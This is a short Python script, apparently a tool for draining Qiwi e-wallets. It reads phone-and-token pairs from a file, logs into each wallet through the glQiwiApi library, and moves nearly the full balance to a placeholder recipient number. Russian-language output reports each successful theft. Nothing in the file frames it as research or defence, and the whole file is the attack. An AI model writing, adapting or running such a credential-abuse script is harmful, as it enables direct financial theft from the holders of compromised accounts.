from glQiwiApi import QiwiWrapper
import asyncio
import random

with open('source.txt', 'r') as f:
	tokens = [i.split(':')[0] + ':' + i.split(':')[2] for i in f.readlines()]

async def main():
	for i in tokens:
		try:
			n = i.split(':')
			wallet = QiwiWrapper(
					api_access_token=n[1],
					phone_number=n[0]
					)
			async with wallet as w:
				try: balance = (await w.get_balance()).amount
				except: balance = 0
				
				if balance != 0:
					rnd = random.randint(0, 9999999)
					trans_id = await w.to_wallet(
							to_number = 'ваш номер',
							comment = f'#{rnd} w',
							trans_sum = balance - balance / 100 - 0.01)
					print(f'{i} успех, +{balance - balance / 100 - 0.01}')
		except Exception as e:
			print(i, f'{e}')

if __name__ == '__main__':
	asyncio.run(main())
